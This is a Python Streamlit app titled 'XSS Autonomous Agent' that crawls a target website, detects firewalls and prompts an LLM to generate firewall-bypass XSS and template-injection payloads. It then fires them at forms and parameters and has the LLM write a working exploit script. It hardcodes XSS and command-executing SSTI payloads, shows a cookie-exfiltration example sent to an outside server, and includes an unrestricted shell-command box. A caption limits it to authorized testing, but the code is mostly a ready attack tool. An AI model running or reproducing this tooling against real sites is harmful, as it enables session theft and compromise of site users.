import streamlit as st
import os
import subprocess
import requests
import re
import urllib.parse
import json
import time
import queue
from openai import OpenAI
from bs4 import BeautifulSoup
from collections import deque
from datetime import datetime

st.set_page_config(
    page_title="XSS Autonomous Agent",
    page_icon="🕷️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Constants ─────────────────────────────────────────────────────────────────
MODEL = "deepseek/deepseek-r1"
BASE_URL = "https://openrouter.ai/api/v1"
MAX_TOKENS = 1500
MAX_PAGES = 40
REQUEST_TIMEOUT = 12
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

# DOM XSS sinks — JS patterns that can execute injected content
DOM_SINKS = [
    r"innerHTML\s*[+=]",
    r"outerHTML\s*[+=]",
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"\.insertAdjacentHTML\s*\(",
    r"eval\s*\(",
    r"setTimeout\s*\(\s*['\"`]",
    r"setInterval\s*\(\s*['\"`]",
    r"new\s+Function\s*\(",
    r"location\.href\s*=",
    r"location\.assign\s*\(",
    r"location\.replace\s*\(",
    r"\.src\s*=",
    r"\.action\s*=",
    r"\.href\s*=",
    r"dangerouslySetInnerHTML",
    r"v-html\s*=",
    r"\$\s*\(\s*['\"`].*html",
    r"\.html\s*\(",
    r"\.append\s*\(",
    r"\.prepend\s*\(",
    r"\.after\s*\(",
    r"\.before\s*\(",
]

# Template engine signatures
TEMPLATE_ENGINES = {
    "jinja2/flask": [r"render_template", r"Jinja2", r"flask"],
    "django": [r"django.template", r"{% block", r"{{ request"],
    "twig": [r"Twig\\", r"twig_"],
    "smarty": [r"Smarty", r"\{assign"],
    "erb": [r"<%= ", r"<%=", r"ActionView"],
    "handlebars": [r"Handlebars", r"{{#if", r"{{#each"],
    "mustache": [r"Mustache", r"{{&"],
    "pug/jade": [r"pug\.render", r"jade\.render"],
    "nunjucks": [r"nunjucks", r"{% for"],
    "velocity": [r"#set\(", r"\$!{", r"VelocityContext"],
    "freemarker": [r"freemarker", r"\${.+}", r"<#if"],
    "thymeleaf": [r"th:text", r"th:utext", r"thymeleaf"],
}

SSTI_PAYLOADS = {
    "generic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "{% debug %}", "@(7*7)"],
    "jinja2": ["{{config}}", "{{request.environ}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
    "twig": ["{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"],
    "smarty": ["{php}echo `id`;{/php}", "{system('id')}"],
}

# ── Session state ─────────────────────────────────────────────────────────────
defaults = {
    "log": [], "findings": [], "running": False, "done": False,
    "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
    "exploit_code": "", "report": "", "dom_sinks": [], "waf_detected": False,
    "_last_target": "", "_last_payload": "",
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v


def get_client():
    key = os.environ.get("OPENROUTER_API_KEY", "")
    if not key:
        st.error("OPENROUTER_API_KEY not set in Replit Secrets.")
        st.stop()
    return OpenAI(api_key=key, base_url=BASE_URL)


def ts():
    return datetime.now().strftime("%H:%M:%S")


def log(msg: str, kind: str = "info"):
    icons = {"info": "▸", "ok": "✅", "warn": "⚠️",
             "vuln": "🚨", "ai": "🤖", "cmd": "⚙️", "dom": "🔬"}
    prefix = icons.get(kind, "▸")
    st.session_state.log.append(f"[{ts()}] {prefix} {msg}")


def safe_req(method: str, url: str, **kwargs):
    try:
        fn = requests.get if method == "get" else requests.post
        return fn(url, headers=HEADERS, timeout=REQUEST_TIMEOUT,
                  allow_redirects=True, **kwargs)
    except Exception:
        return None


def same_origin(base: str, url: str) -> bool:
    try:
        return urllib.parse.urlparse(base).netloc == urllib.parse.urlparse(url).netloc
    except Exception:
        return False


def absolute(base: str, href: str):
    try:
        url = urllib.parse.urljoin(base, href)
        p = urllib.parse.urlparse(url)
        if p.scheme in ("http", "https") and p.netloc:
            return url
    except Exception:
        pass
    return None


# ── WAF detection ─────────────────────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
    "AWS WAF": ["awswaf", "x-amzn-requestid"],
    "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
    "Akamai": ["akamai", "ak_bmsc"],
    "Sucuri": ["sucuri", "x-sucuri"],
    "Imperva": ["imperva", "incapsula", "_utmz"],
    "Wordfence": ["wordfence"],
    "Nginx WAF": ["nginx", "naxsi"],
    "F5 BIG-IP ASM": ["ts=", "bigipserver"],
    "Barracuda": ["barracuda_"],
}

def detect_waf(resp: requests.Response) -> str | None:
    if not resp:
        return None
    combined = (resp.text[:2000] + str(resp.headers) + str(resp.cookies)).lower()
    for waf, sigs in WAF_SIGNATURES.items():
        if any(s.lower() in combined for s in sigs):
            return waf
    if resp.status_code in (403, 406, 429, 503) and len(resp.text) < 500:
        return "Unknown WAF (blocked response)"
    return None


# ── Crawler ───────────────────────────────────────────────────────────────────
def crawl(target: str, max_depth: int) -> list[dict]:
    visited = set()
    bfsq = deque([(target, 0)])
    pages = []

    while bfsq and len(pages) < MAX_PAGES:
        url, depth = bfsq.popleft()
        norm = url.split("#")[0].rstrip("/")
        if norm in visited:
            continue
        visited.add(norm)

        resp = safe_req("get", url)
        if not resp:
            continue
        ct = resp.headers.get("Content-Type", "")
        if "text/html" not in ct and "javascript" not in ct:
            continue

        soup = BeautifulSoup(resp.text, "lxml")
        forms = extract_forms(url, soup)
        params = extract_url_params(url)
        inline_js = extract_inline_js(soup)
        dom_hits = find_dom_sinks(resp.text)

        pages.append({
            "url": url,
            "html": resp.text[:15000],
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "forms": forms,
            "params": params,
            "inline_js": inline_js,
            "dom_sinks": dom_hits,
        })
        log(f"Crawled [{len(pages)}]: {url} — {len(forms)} forms, "
            f"{len(params)} params, {len(dom_hits)} DOM sinks", "cmd")
        st.session_state.pages_crawled = len(pages)

        if depth < max_depth:
            for tag in soup.find_all("a", href=True):
                nxt = absolute(url, tag["href"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
            # Also crawl linked JS files
            for tag in soup.find_all("script", src=True):
                nxt = absolute(url, tag["src"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
    return pages


def extract_forms(page_url: str, soup: BeautifulSoup) -> list[dict]:
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action", "") or page_url
        method = form.get("method", "get").lower()
        action_url = absolute(page_url, action) or page_url
        fields = []
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name") or inp.get("id") or ""
            itype = inp.get("type", "text")
            if name and itype not in ("submit", "button", "image", "file"):
                fields.append({"name": name, "type": itype,
                                "value": inp.get("value", "")})
        if fields:
            forms.append({"action": action_url, "method": method, "fields": fields})
    return forms


def extract_url_params(url: str) -> list[str]:
    return list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())


def extract_inline_js(soup: BeautifulSoup) -> str:
    scripts = []
    for tag in soup.find_all("script"):
        if not tag.get("src") and tag.string:
            scripts.append(tag.string[:500])
    return "\n".join(scripts[:10])


def find_dom_sinks(html: str) -> list[str]:
    found = []
    for pattern in DOM_SINKS:
        matches = re.findall(f".{{0,60}}{pattern}.{{0,80}}", html)
        for m in matches[:2]:
            found.append(m.strip())
    return found[:15]


def detect_template_engine(pages: list[dict]) -> tuple[str, list[str]]:
    combined = " ".join(p["html"] for p in pages[:5])
    for engine, sigs in TEMPLATE_ENGINES.items():
        for sig in sigs:
            if re.search(sig, combined, re.IGNORECASE):
                return engine, SSTI_PAYLOADS.get(
                    engine.split("/")[0], SSTI_PAYLOADS["generic"])
    return "", SSTI_PAYLOADS["generic"]


def analyze_headers(headers: dict) -> list[str]:
    issues = []
    hkeys = {k.lower() for k in headers}
    checks = {
        "content-security-policy": "No CSP — inline scripts fully allowed",
        "x-xss-protection": "No X-XSS-Protection",
        "x-content-type-options": "No X-Content-Type-Options — MIME sniffing open",
        "x-frame-options": "No X-Frame-Options — clickjacking open",
    }
    for h, msg in checks.items():
        if h not in hkeys:
            issues.append(msg)
    csp = next((v for k, v in headers.items() if k.lower() == "content-security-policy"), "")
    if csp:
        if "unsafe-inline" in csp:
            issues.append("CSP has 'unsafe-inline' — XSS protection bypassed")
        if "unsafe-eval" in csp:
            issues.append("CSP has 'unsafe-eval' — eval-based XSS allowed")
        if re.search(r"script-src[^;]*\*", csp):
            issues.append("CSP script-src uses wildcard — bypassable")
    return issues


# ── AI: generate elite payloads ───────────────────────────────────────────────
def ai_generate_payloads(client, target: str, user_payload: str,
                          context: str, waf: str, dom_sinks: list[str],
                          template_engine: str) -> list[str]:
    waf_note = f"A {waf} WAF is detected — include specific bypass techniques for it." if waf else "No WAF detected."
    sink_note = ("DOM sinks found: " + "; ".join(dom_sinks[:5])) if dom_sinks else "No DOM sinks detected in JS."
    engine_note = f"Template engine detected: {template_engine} — include SSTI payloads." if template_engine else ""

    prompt = f"""You are an elite offensive security researcher specializing in XSS zero-days and HTML injection.
Your goal is to find and exploit HTML injection vulnerabilities — you are authorized to test this target.

Target: {target}
User payload intent: {user_payload}
{waf_note}
{sink_note}
{engine_note}

Relevant page HTML/JS context:
{context[:2500]}

Generate 15 injection payloads that will find zero-days. Think creatively:
- Context-specific breakouts (attribute context, JS context, CSS context, URL context)
- WAF bypass techniques (encoding, obfuscation, case variation, null bytes, comments, chunking)
- Polyglots that work across multiple contexts
- DOM-based XSS leveraging the sink patterns found above
- Mutation XSS (mXSS) using browser parser quirks
- Template injection / SSTI if a template engine is present
- Filter bypass tricks (double encoding, unicode normalization, HTML5 vectors)
- CSP bypass payloads if applicable
- The user's specified payload adapted to this exact context

Output ONLY a valid JSON array of payload strings. No explanation, no markdown fences, no comments."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=800,
            temperature=0.5,
        )
        text = resp.choices[0].message.content.strip()
        text = re.sub(r"```[a-z]*|```", "", text).strip()
        match = re.search(r"\[.*\]", text, re.DOTALL)
        if match:
            parsed = json.loads(match.group())
            if isinstance(parsed, list) and parsed:
                log(f"AI generated {len(parsed)} context-aware payloads", "ai")
                return [str(p) for p in parsed]
    except Exception as e:
        log(f"Payload gen warning: {e}", "warn")

    # Hard fallback set
    return [
        user_payload,
        f'<script>alert("XSS")</script>',
        f'"><script>alert(1)</script>',
        f"'><img src=x onerror=alert(1)>",
        f'<svg/onload=alert(1)>',
        f'<details/open/ontoggle=alert(1)>',
        f'<video src=1 onerror=alert(1)>',
        f'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
        f'";alert(1)//',
        f"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        f'<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">',
        f'<math><mtext></mtext></math><script>alert(1)</script>',
        f'<table><tbody><tr><td><script>alert(1)</script></td></tr></tbody></table>',
        f'{{{{7*7}}}}',
        f'${{{user_payload}}}',
    ]


# ── Test injection ────────────────────────────────────────────────────────────
def test_injection(url: str, param: str, payload: str, method: str = "get") -> dict:
    result = {
        "url": url, "param": param, "payload": payload,
        "method": method, "status": None, "reflected": False,
        "escaped": False, "context": "", "body_snippet": ""
    }
    try:
        if method == "get":
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            params[param] = payload
            test_url = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
            resp = requests.get(test_url, headers=HEADERS,
                                timeout=REQUEST_TIMEOUT, allow_redirects=True)
        else:
            resp = requests.post(url, data={param: payload}, headers=HEADERS,
                                 timeout=REQUEST_TIMEOUT, allow_redirects=True)

        result["status"] = resp.status_code
        body = resp.text

        if payload in body:
            result["reflected"] = True
            escaped_forms = [
                payload.replace("<", "&lt;").replace(">", "&gt;"),
                payload.replace('"', "&quot;").replace("'", "&#x27;"),
                urllib.parse.quote(payload),
                payload.replace("<", "\\u003c").replace(">", "\\u003e"),
            ]
            if any(ev in body for ev in escaped_forms):
                result["escaped"] = True
            idx = body.find(payload)
            snippet = body[max(0, idx - 120):idx + 250]
            result["body_snippet"] = snippet
            result["context"] = detect_injection_context(snippet, payload)
    except Exception as e:
        result["error"] = str(e)
    return result


def detect_injection_context(snippet: str, payload: str) -> str:
    before = snippet[:snippet.find(payload)] if payload in snippet else snippet[:50]
    before_stripped = before.strip()
    if re.search(r'<script[^>]*>[^<]*$', before, re.DOTALL):
        return "JavaScript context (inside <script>)"
    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', before):
        return "Event handler attribute value"
    if re.search(r'href\s*=\s*["\'][^"\']*$', before) or re.search(r'src\s*=\s*["\'][^"\']*$', before):
        return "URL attribute context"
    if re.search(r'<style[^>]*>[^<]*$', before, re.DOTALL):
        return "CSS context (inside <style>)"
    if re.search(r'=\s*["\'][^"\']*$', before):
        return "HTML attribute value"
    if re.search(r'<[a-zA-Z][^>]*$', before):
        return "Inside HTML tag (attribute injection)"
    return "HTML body context"


def test_page(page: dict, payloads: list[str]) -> list[dict]:
    hits = []
    # URL params
    for param in page.get("params", []):
        for payload in payloads[:8]:
            r = test_injection(page["url"], param, payload, "get")
            if r["reflected"] and not r["escaped"]:
                hits.append(r)
                log(f"🚨 VULN [{r['context']}] {page['url']} ?{param}=...", "vuln")
                break  # one confirmed hit per param is enough
            elif r["reflected"]:
                log(f"Escaped: {page['url']} param={param}", "warn")
    # Forms
    for form in page.get("forms", []):
        for field in form.get("fields", []):
            for payload in payloads[:8]:
                r = test_injection(form["action"], field["name"], payload, form["method"])
                if r["reflected"] and not r["escaped"]:
                    hits.append(r)
                    log(f"🚨 VULN [{r['context']}] form={form['action']} field={field['name']}", "vuln")
                    break
    return hits


# ── AI: write exploit ─────────────────────────────────────────────────────────
def ai_write_exploit(client, findings: list[dict], target: str) -> str:
    if not findings:
        return ""
    f = findings[0]
    prompt = f"""You are writing a working Python exploit for a confirmed XSS / HTML injection vulnerability.
This is an authorized penetration test.

Target: {target}
Vulnerable URL: {f['url']}
Parameter: {f['param']}
Method: {f['method'].upper()}
Injection context: {f.get('context', 'HTML body')}
Working payload: {f['payload']}
Response snippet showing reflection: {f.get('body_snippet', '')[:600]}

Write a complete, working Python script using requests that:
1. Sends the exploit payload
2. Verifies it was injected unescaped
3. Optionally demonstrates impact (e.g. cookie theft simulation)
Include inline comments. Output only Python code."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS,
            temperature=0.2,
        )
        code = resp.choices[0].message.content.strip()
        return re.sub(r"```python|```", "", code).strip()
    except Exception as e:
        return f"# Error: {e}"


# ── AI: full report ───────────────────────────────────────────────────────────
def ai_full_report(client, findings: list[dict], pages: list[dict],
                   target: str, dom_sinks: list, waf: str) -> str:
    surface = {
        "pages": len(pages),
        "forms": sum(len(p["forms"]) for p in pages),
        "url_params": sum(len(p["params"]) for p in pages),
        "dom_sinks_total": len(dom_sinks),
        "waf": waf or "none detected",
        "page_urls": [p["url"] for p in pages[:12]],
    }

    if findings:
        fsum = json.dumps([{
            "url": f["url"], "param": f["param"], "payload": f["payload"],
            "method": f["method"], "context": f.get("context", ""),
            "snippet": f.get("body_snippet", "")[:300]
        } for f in findings[:6]], indent=2)
        prompt = f"""You are a senior penetration tester. Write a concise but technical security report.

Target: {target}
Confirmed injection findings:
{fsum}

Attack surface summary:
{json.dumps(surface, indent=2)}

DOM sinks found:
{chr(10).join(dom_sinks[:8])}

Write:
## Executive Summary
## Confirmed Vulnerabilities (severity, CVSS score, context, impact, PoC steps)
## DOM-based Attack Surface
## Remediation (specific code fixes)
## What to Test Next (blind XSS, stored XSS, chained attacks)

Be technical and actionable. Mention chaining opportunities."""
    else:
        prompt = f"""You are a senior penetration tester. No direct reflections were found, but you found attack surface.

Target: {target}
Attack surface: {json.dumps(surface, indent=2)}
DOM sinks: {chr(10).join(dom_sinks[:8])}
WAF: {waf or 'none'}

Write a targeted next-steps report:
## What Was Found (surface map)
## Why Standard Payloads Missed (WAF? sanitization? SPA?)
## Blind XSS Vectors to Test Next
## DOM-based XSS Attack Plan (based on sinks found)
## Stored XSS Vectors (forms that might store data)
## Specific Advanced Payloads to Try Manually
## CSP/Header Issues

Be specific with payload examples and curl commands."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS,
            temperature=0.2,
        )
        return resp.choices[0].message.content
    except Exception as e:
        return f"Error: {e}"


# ── Main agent ────────────────────────────────────────────────────────────────
def run_agent(target: str, user_payload: str, max_depth: int):
    client = get_client()
    for k, v in defaults.items():
        if k not in ("_last_target", "_last_payload"):
            st.session_state[k] = v

    log(f"Target: {target}", "info")
    log(f"Inject: {user_payload}", "info")
    log(f"Crawl depth: {max_depth}", "info")
    log("━" * 40, "info")

    # ── Phase 1: Crawl ────────────────────────────────────────────────────────
    log("PHASE 1 — CRAWL & RECON", "info")
    pages = crawl(target, max_depth)
    log(f"Pages: {len(pages)} | Forms: {sum(len(p['forms']) for p in pages)} | "
        f"URL params: {sum(len(p['params']) for p in pages)}", "ok")

    # Aggregate DOM sinks
    all_dom_sinks = []
    for p in pages:
        all_dom_sinks.extend(p.get("dom_sinks", []))
    st.session_state.dom_sinks = all_dom_sinks[:20]
    if all_dom_sinks:
        log(f"DOM sinks found: {len(all_dom_sinks)}", "dom")
        for sink in all_dom_sinks[:5]:
            log(f"  {sink[:100]}", "dom")

    # WAF detection
    resp0 = safe_req("get", target)
    waf = detect_waf(resp0) if resp0 else None
    if waf:
        log(f"WAF detected: {waf} — bypass payloads will be generated", "warn")
        st.session_state.waf_detected = True
    else:
        log("No WAF detected", "ok")

    # Header analysis
    if pages:
        header_issues = analyze_headers(pages[0]["headers"])
        for issue in header_issues:
            log(issue, "warn")

    # Template engine detection
    template_engine, ssti_payloads = detect_template_engine(pages)
    if template_engine:
        log(f"Template engine: {template_engine} — SSTI payloads added", "warn")

    # ── Phase 2: AI Payload Gen ───────────────────────────────────────────────
    log("━" * 40, "info")
    log("PHASE 2 — AI PAYLOAD GENERATION", "ai")
    context = ""
    for p in pages[:6]:
        if p["forms"] or p["params"] or p["dom_sinks"]:
            context += f"\n[{p['url']}]\n{p['html'][:1200]}\n"

    payloads = ai_generate_payloads(client, target, user_payload, context,
                                     waf or "", all_dom_sinks, template_engine)
    # Merge SSTI payloads if template engine found
    if template_engine:
        payloads = payloads + ssti_payloads[:4]
    for i, pl in enumerate(payloads[:6], 1):
        log(f"  [{i}] {pl[:90]}", "cmd")

    # ── Phase 3: Injection Testing ────────────────────────────────────────────
    log("━" * 40, "info")
    log("PHASE 3 — INJECTION TESTING", "info")
    all_findings = []
    total_points = 0

    for page in pages:
        total_points += len(page.get("params", [])) + sum(
            len(f.get("fields", [])) for f in page.get("forms", []))
        hits = test_page(page, payloads)
        all_findings.extend(hits)

    st.session_state.points_found = total_points
    st.session_state.vulns_found = len(all_findings)
    st.session_state.findings = all_findings
    log(f"Tested {total_points} points | {len(all_findings)} confirmed injections", "ok")

    # ── Phase 4: Exploit ──────────────────────────────────────────────────────
    if all_findings:
        log("━" * 40, "info")
        log("PHASE 4 — EXPLOIT GENERATION", "ai")
        exploit = ai_write_exploit(client, all_findings, target)
        st.session_state.exploit_code = exploit
        log("Custom exploit written", "ok")

    # ── Phase 5: Report ───────────────────────────────────────────────────────
    log("━" * 40, "info")
    log("PHASE 5 — AI SECURITY REPORT", "ai")
    report = ai_full_report(client, all_findings, pages, target, all_dom_sinks, waf or "")
    st.session_state.report = report
    log("Report complete", "ok")
    log("━" * 40 + " SCAN DONE " + "━" * 40, "ok")
    st.session_state.done = True
    st.session_state.running = False


# ── UI ────────────────────────────────────────────────────────────────────────
st.markdown("""
<style>
.terminal {
    background: #0d1117;
    color: #39ff14;
    font-family: 'Courier New', monospace;
    font-size: 12.5px;
    padding: 16px;
    border-radius: 8px;
    height: 440px;
    overflow-y: auto;
    white-space: pre-wrap;
    border: 1px solid #238636;
    line-height: 1.5;
}
</style>
""", unsafe_allow_html=True)

st.title("🕷️ XSS Autonomous Agent")
st.caption("Authorized use only — only test systems you own or have explicit written permission to test.")

with st.container(border=True):
    st.subheader("🎯 Mission")
    col1, col2 = st.columns([3, 1])
    with col1:
        target_input = st.text_input(
            "Target URL",
            value=st.session_state._last_target,
            placeholder="https://your-test-site.com"
        )
    with col2:
        depth_input = st.slider("Crawl depth", 1, 4, 2)

    payload_input = st.text_area(
        "What to inject",
        value=st.session_state._last_payload,
        placeholder='<script>alert("owned")</script>   or   <img src=x onerror=fetch("https://myserver/?c="+document.cookie)>',
        height=75,
    )

    col_a, col_b = st.columns([2, 1])
    with col_a:
        start_btn = st.button("🚀 Launch Agent", type="primary",
                              use_container_width=True, disabled=st.session_state.running)
    with col_b:
        if st.button("🗑️ Reset", use_container_width=True):
            for k, v in defaults.items():
                st.session_state[k] = v
            st.session_state.report = ""
            st.rerun()

s1, s2, s3, s4, s5 = st.columns(5)
s1.metric("Pages", st.session_state.pages_crawled)
s2.metric("Injection pts", st.session_state.points_found)
s3.metric("DOM sinks", len(st.session_state.dom_sinks))
s4.metric("Vulns", st.session_state.vulns_found,
          delta="🚨" if st.session_state.vulns_found > 0 else None)
s5.metric("WAF", "⚠️ YES" if st.session_state.waf_detected else "✅ None")

st.subheader("💻 Agent Terminal")
log_text = "\n".join(st.session_state.log) if st.session_state.log else "Ready. Configure a target and launch."
st.markdown(f'<div class="terminal">{log_text}</div>', unsafe_allow_html=True)

tab1, tab2, tab3 = st.tabs(["📊 Findings & Report", "💻 Exploit Code", "🔍 Manual Terminal"])

with tab1:
    if st.session_state.findings:
        st.error(f"🚨 {len(st.session_state.findings)} confirmed unescaped injection(s)")
        for i, f in enumerate(st.session_state.findings, 1):
            with st.expander(f"#{i} — {f.get('context','?')} @ {f['url']}", expanded=i == 1):
                st.code(f["payload"], language="html")
                st.markdown(
                    f"**URL:** `{f['url']}`  \n"
                    f"**Param:** `{f['param']}`  \n"
                    f"**Method:** `{f['method'].upper()}`  \n"
                    f"**Context:** `{f.get('context', 'unknown')}`  \n"
                    f"**HTTP:** `{f.get('status', '?')}`"
                )
                if f.get("body_snippet"):
                    st.code(f["body_snippet"], language="html")

    if st.session_state.dom_sinks:
        st.subheader("🔬 DOM Sinks Found")
        for sink in st.session_state.dom_sinks[:10]:
            st.code(sink, language="javascript")

    if st.session_state.get("report"):
        st.divider()
        st.subheader("📝 AI Security Report")
        st.markdown(st.session_state.report)

    if not st.session_state.findings and not st.session_state.done:
        st.info("Launch the agent to see findings here.")

with tab2:
    if st.session_state.exploit_code:
        st.subheader("🔧 AI-Generated Exploit")
        st.code(st.session_state.exploit_code, language="python")
        st.download_button("⬇️ exploit.py", st.session_state.exploit_code,
                           file_name="exploit.py", mime="text/plain")
    else:
        st.info("Exploit code appears here when a vulnerability is confirmed.")

with tab3:
    st.subheader("Manual Terminal")
    mc = st.text_input("Command", placeholder="curl -sIL https://target.com | head -40")
    if st.button("▶ Run") and mc.strip():
        with st.spinner("Running..."):
            try:
                r = subprocess.run(mc, shell=True, capture_output=True, text=True, timeout=30)
                out = (r.stdout + r.stderr).strip() or "(no output)"
            except subprocess.TimeoutExpired:
                out = "[TIMEOUT]"
            except Exception as e:
                out = f"[ERROR] {e}"
        st.code(out, language="bash")

# ── Launch ────────────────────────────────────────────────────────────────────
if start_btn:
    if not target_input.strip():
        st.warning("Enter a target URL.")
    elif not payload_input.strip():
        st.warning("Enter what you want to inject.")
    else:
        st.session_state._last_target = target_input.strip()
        st.session_state._last_payload = payload_input.strip()
        st.session_state.running = True
        st.session_state.done = False
        st.rerun()

if st.session_state.running and not st.session_state.done:
    run_agent(
        st.session_state._last_target,
        st.session_state._last_payload,
        depth_input,
    )
    st.rerun()
